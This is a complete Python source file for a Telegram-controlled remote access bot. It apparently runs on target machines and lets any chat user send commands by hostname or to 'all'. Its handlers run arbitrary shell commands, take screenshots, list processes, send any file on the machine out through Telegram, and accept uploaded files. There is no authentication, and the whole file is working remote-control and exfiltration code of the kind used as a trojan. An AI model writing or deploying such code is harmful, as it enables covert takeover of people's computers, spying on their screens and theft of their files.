import os
import subprocess
from io import BytesIO
import telebot
import platform
import socket
import mss
import mss.tools
import psutil
import logging

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

API_TOKEN = 'YOUR_API_TOKEN_HERE'
bot = telebot.TeleBot(API_TOKEN)


def get_hostname():
    hostname = socket.gethostname()
    logging.debug("Hostname retrieved: %s", hostname)
    return hostname


def parse_command(message_text):
    parts = message_text.split(maxsplit=2)
    if len(parts) < 3:
        logging.debug("Failed to parse command properly: %s", message_text)
        return None, None
    target = parts[1].lower()
    argument = parts[2]
    logging.debug("Parsed command - target: %s, argument: %s", target, argument)
    return target, argument


@bot.message_handler(commands=['help'])
def handle_help(message):
    logging.info("Received help command from chat id: %s", message.chat.id)
    help_text = (
        "Available Commands\n\n"
        "/help - Show this help message\n"
        "/list - Show machine information\n"
        "/cmd <target|all> <command> - Execute a shell command on the machine\n"
        "/screenshot <target|all> - Capture and send a screenshot of the primary monitor\n"
        "/status <target|all> - Show CPU, RAM, and Disk usage\n"
        "/processes <target|all> - List all running processes\n"
        "/download <target|all> <filepath> - Download a file from the machine\n\n"
        "You can upload files by sending a document\n\n"
        "Note: Replace <target|all> with the hostname of the target machine or use 'all' for broadcast."
    )
    bot.reply_to(message, help_text)
    logging.debug("Sent help message.")


@bot.message_handler(commands=['list'])
def handle_list(message):
    logging.info("Received list command from chat id: %s", message.chat.id)
    try:
        hostname = get_hostname()
        os_info = platform.platform()
        ip_address = socket.gethostbyname(hostname)
        response = (
            "Machine Information\n"
            "Hostname: {}\n"
            "Operating System: {}\n"
            "IP Address: {}"
        ).format(hostname, os_info, ip_address)
        bot.reply_to(message, response)
        logging.debug("Sent list response: %s", response)
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in list command: %s", error_message)


@bot.message_handler(commands=['cmd'])
def handle_command(message):
    logging.info("Received CMD command from chat id: %s", message.chat.id)
    target, command = parse_command(message.text)
    if not command:
        bot.reply_to(message, "Usage: /cmd <target|all> <command>")
        logging.warning("CMD command missing arguments: %s", message.text)
        return
    if target != 'all' and target != get_hostname().lower():
        logging.debug("CMD target mismatch. Ignoring command: target=%s", target)
        return
    try:
        logging.debug("Executing shell command: %s", command)
        process = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=60
        )
        stdout = process.stdout.strip()
        stderr = process.stderr.strip()
        if stdout:
            response = "Output\n\n{}".format(stdout)
        elif stderr:
            response = "Error\n\n{}".format(stderr)
        else:
            response = "Command executed successfully with no output"

        if len(response) > 3000:
            bio = BytesIO(response.encode())
            bio.seek(0)
            bio.name = "output.txt"
            bot.send_document(message.chat.id, bio, caption="Output")
            logging.debug("Sent CMD output as document.")
        else:
            bot.reply_to(message, response)
            logging.debug("Sent CMD response: %s", response)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "Error: Command execution timed out")
        logging.error("CMD command timed out: %s", command)
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in CMD command: %s", error_message)


@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    logging.info("Received screenshot command from chat id: %s", message.chat.id)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /screenshot <target|all>")
        logging.warning("Screenshot command missing target: %s", message.text)
        return

    target = parts[1].strip().lower()
    current_hostname = get_hostname().lower()
    logging.debug("Screenshot target parsed: %s", target)

    if target != 'all' and target != current_hostname:
        logging.debug("Screenshot target mismatch. Ignoring command: target=%s", target)
        return

    try:
        logging.debug("Capturing screenshot using mss.")
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            img = mss.tools.to_png(screenshot.rgb, screenshot.size)
            bio = BytesIO(img)
            bio.name = 'screenshot.png'
            bio.seek(0)
        bot.send_photo(message.chat.id, bio, caption="Screenshot")
        logging.debug("Screenshot captured and sent successfully.")
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in screenshot command: %s", error_message)


@bot.message_handler(commands=['status'])
def handle_status(message):
    logging.info("Received status command from chat id: %s", message.chat.id)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /status <target|all>")
        logging.warning("Status command missing target: %s", message.text)
        return

    target = parts[1].strip().lower()
    hostname = get_hostname().lower()
    logging.debug("Parsed target for status command: %s", target)

    if target != 'all' and target != hostname:
        logging.debug("Status target mismatch. Ignoring command: target=%s", target)
        return

    try:
        cpu = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        response = (
            "System Status\n"
            "CPU Usage: {}%\n"
            "RAM Usage: {}%\n"
            "Disk Usage: {}%"
        ).format(cpu, memory, disk)
        bot.reply_to(message, response)
        logging.debug("Sent status response: %s", response)
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in status command: %s", error_message)


@bot.message_handler(commands=['processes'])
def handle_processes(message):
    logging.info("Received processes command from chat id: %s", message.chat.id)
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /processes <target|all>")
        logging.warning("Processes command missing target: %s", message.text)
        return

    target = parts[1].strip().lower()
    hostname = get_hostname().lower()
    logging.debug("Parsed target for processes command: %s", target)
    if target != 'all' and target != hostname:
        logging.debug("Processes target mismatch. Ignoring command: target=%s", target)
        return

    try:
        processes = [
            "{} {}".format(proc.pid, proc.name())
            for proc in psutil.process_iter(['pid', 'name'])
        ]
        response = "Running Processes\n\n" + "\n".join(processes)
        if len(response) > 3000:
            bio = BytesIO(response.encode())
            bio.seek(0)
            bio.name = "processes.txt"
            bot.send_document(message.chat.id, bio, caption="Processes")
            logging.debug("Sent processes list as document.")
        else:
            bot.reply_to(message, response)
            logging.debug("Sent processes response.")
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in processes command: %s", error_message)


@bot.message_handler(commands=['download'])
def handle_download(message):
    logging.info("Received download command from chat id: %s", message.chat.id)
    target, file_path = parse_command(message.text)
    if target != 'all' and target != get_hostname().lower():
        logging.debug("Download target mismatch. Ignoring command: target=%s", target)
        return
    try:
        if not file_path:
            bot.reply_to(message, "Usage: /download <target|all> <file_path>")
            logging.warning("Download command missing file_path.")
            return
        file_path = file_path.strip().strip('"').strip("'")
        if not os.path.isfile(file_path):
            bot.reply_to(message, "Error: File not found")
            logging.warning("File not found: %s", file_path)
            return
        with open(file_path, 'rb') as f:
            bio = BytesIO(f.read())
            bio.name = os.path.basename(file_path)
        bot.send_document(message.chat.id, bio, caption="File: {}".format(file_path))
        logging.debug("Downloaded and sent file: %s", file_path)
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in download command: %s", error_message)


@bot.message_handler(content_types=['document'])
def handle_upload(message):
    logging.info("Received file upload from chat id: %s", message.chat.id)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        uploads_dir = 'uploads'
        os.makedirs(uploads_dir, exist_ok=True)
        file_path = os.path.join(uploads_dir, message.document.file_name)
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, "File uploaded successfully: {}".format(file_path))
        logging.debug("File uploaded successfully: %s", file_path)
    except Exception as e:
        error_message = "Error: {}".format(e)
        bot.reply_to(message, error_message)
        logging.error("Error in file upload: %s", error_message)


@bot.message_handler(func=lambda message: True)
def default_handler(message):
    text = message.text.strip()
    if text.startswith('/'):
        bot.reply_to(message, "Invalid command or wrong format. Use /help to see available commands.")
        logging.warning("Unknown or incorrectly formatted command received: %s", text)


if __name__ == '__main__':
    logging.info("Bot is starting...")
    bot.polling(none_stop=True)
